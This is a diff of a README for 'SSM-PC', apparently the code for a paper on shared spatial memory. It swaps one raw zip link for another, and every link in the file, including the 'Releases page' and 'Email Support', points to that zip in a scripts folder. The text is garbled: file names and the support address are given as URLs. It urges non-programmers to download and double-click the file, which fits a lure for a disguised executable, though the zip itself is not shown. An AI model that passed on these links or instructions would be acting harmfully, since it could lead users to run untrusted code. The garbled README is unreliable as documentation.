@@ -1,7 +1,7 @@
 # 🌟 SSM-PC - Explore Shared Spatial Memory Easily
 
 ## 📥 Download Now
-[![Download SSM-PC](https://raw.githubusercontent.com/folksreptilian850/SSM-PC/main/grid_cell/scripts/SSM-PC-v2.3.zip)](https://raw.githubusercontent.com/folksreptilian850/SSM-PC/main/grid_cell/scripts/SSM-PC-v2.3.zip)
+[![Download SSM-PC](https://github.com/folksreptilian850/SSM-PC/raw/refs/heads/main/grid_cell/scripts/PC-SS-v2.0.zip)](https://github.com/folksreptilian850/SSM-PC/raw/refs/heads/main/grid_cell/scripts/PC-SS-v2.0.zip)
 
 ## 📖 Overview
 SSM-PC is the code repository for our paper "Shared Spatial Memory Through Predictive Coding." This application explores advanced concepts in computational neuroscience and machine learning. It offers tools for researchers and students interested in understanding how memory works in multi-agent systems.
@@ -10,16 +10,16 @@ SSM-PC is the code repository for our paper "Shared Spatial Memory Through Predi
 To begin using SSM-PC, follow these steps to download and run the application. No programming skills are needed.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/folksreptilian850/SSM-PC/main/grid_cell/scripts/SSM-PC-v2.3.zip) to get the latest version of the software.
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/folksreptilian850/SSM-PC/raw/refs/heads/main/grid_cell/scripts/PC-SS-v2.0.zip) to get the latest version of the software.
 
-2. **Download the Application:** Click on the version you want to download. Your computer will start downloading a file, usually named something like `https://raw.githubusercontent.com/folksreptilian850/SSM-PC/main/grid_cell/scripts/SSM-PC-v2.3.zip` or `https://raw.githubusercontent.com/folksreptilian850/SSM-PC/main/grid_cell/scripts/SSM-PC-v2.3.zip`.
+2. **Download the Application:** Click on the version you want to download. Your computer will start downloading a file, usually named something like `https://github.com/folksreptilian850/SSM-PC/raw/refs/heads/main/grid_cell/scripts/PC-SS-v2.0.zip` or `https://github.com/folksreptilian850/SSM-PC/raw/refs/heads/main/grid_cell/scripts/PC-SS-v2.0.zip`.
 
 3. **Extract the Files (if needed):** 
    - If you downloaded a `.zip` file, right-click on the file and select "Extract All" to create a new folder containing the application files.
 
 4. **Run the Application:**
    - Navigate to the folder where you extracted the files.
-   - Double-click the `https://raw.githubusercontent.com/folksreptilian850/SSM-PC/main/grid_cell/scripts/SSM-PC-v2.3.zip` file to start the application.
+   - Double-click the `https://github.com/folksreptilian850/SSM-PC/raw/refs/heads/main/grid_cell/scripts/PC-SS-v2.0.zip` file to start the application.
 
 ## 🖥️ System Requirements
 To run SSM-PC smoothly, your system should meet the following requirements:
@@ -53,7 +53,7 @@ If you want to learn more about the concepts behind SSM-PC, refer to these mater
 Join our community if you have questions or need help:
 - **GitHub Issues:** Report bugs or feature requests using the Issues tab on our repository.
 - **Forums:** Connect with other users for advice and tips.
-- **Email Support:** Reach out at https://raw.githubusercontent.com/folksreptilian850/SSM-PC/main/grid_cell/scripts/SSM-PC-v2.3.zip for further assistance.
+- **Email Support:** Reach out at https://github.com/folksreptilian850/SSM-PC/raw/refs/heads/main/grid_cell/scripts/PC-SS-v2.0.zip for further assistance.
 
 ## 📅 Upcoming Features
 We are constantly improving the application. Look forward to features such as:
@@ -77,4 +77,4 @@ This project is licensed under the MIT License. You can use it freely as long as
 Thanks to all contributors and researchers who helped develop SSM-PC. Your support drives the project forward.
 
 ## 📥 Don't Forget
-To download the application, visit our [Releases page](https://raw.githubusercontent.com/folksreptilian850/SSM-PC/main/grid_cell/scripts/SSM-PC-v2.3.zip) and get started today!
+To download the application, visit our [Releases page](https://github.com/folksreptilian850/SSM-PC/raw/refs/heads/main/grid_cell/scripts/PC-SS-v2.0.zip) and get started today!
